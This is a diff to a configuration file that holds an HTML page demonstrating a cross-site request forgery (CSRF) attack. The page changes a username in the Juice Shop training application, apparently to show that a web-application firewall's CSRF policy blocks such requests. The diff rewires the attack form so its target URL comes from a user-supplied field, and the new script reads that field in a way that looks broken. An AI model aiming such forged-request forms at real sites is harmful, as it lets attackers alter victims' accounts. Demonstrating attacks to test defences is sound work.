@@ -54,14 +54,6 @@ data:
   index.html: |
     <!DOCTYPE html>
     <html>
-    <script>    
-        let hackingForm = document.getElementById("hackingform");
-        hackingForm.addEventListener("submit", (e) => {
-          e.preventDefault();
-          hackingForm.action = 'JUICESHOP_HOST/profilex'
-          // handle submit
-        });
-    </script>
     <head><title>CSRF Attack</title></head>
     
     <body>
@@ -81,22 +73,23 @@ data:
     <h3>Hacking Form - direct Juiceshop</h3>
     Submit form to hack "username" in Juiceshop
     <form id="hackingform" 
-          action="JUICESHOP_HOST/profile" 
+          action="empty" 
          method="POST">
+        URL:<input id="juiceshopUrl" name="url" type="text" value="" /><br>
      Username:<input name="username" type="text" value="hacked" />
      <input type="submit" value="Hack Username" />
     </form>
-    <!--
-    <hr>
-    <h3>Hacking Form - over Core-WAAP</h3>
-    Submit form to hack "username" in Juiceshop
-    <form id="hackingform" 
-          action="JUICESHOP_WAAP_HOST/profile" 
-         method="POST">
-     Username:<input name="username" type="text" value="hacked" />
-     <input type="submit" value="Hack Username" />
-    </form>
-    -->
+
+    <script>    
+        let juiceshopUrlField = document.getElementById("juiceshopUrl");
+        let hackingForm = document.getElementById("hackingform");
+        hackingForm.addEventListener("submit", (e) => {
+          e.preventDefault();
+          hackingForm.action = juiceshopUrlField.text + '/profile'
+          // handle submit
+        });
+    </script>
+    
     <h3>CSRF Protection</h3>
     <p></p>
     With Core-WAAP CSRF Policy enabled, that "evil" request will be blocked because it does not contain the required origin information  
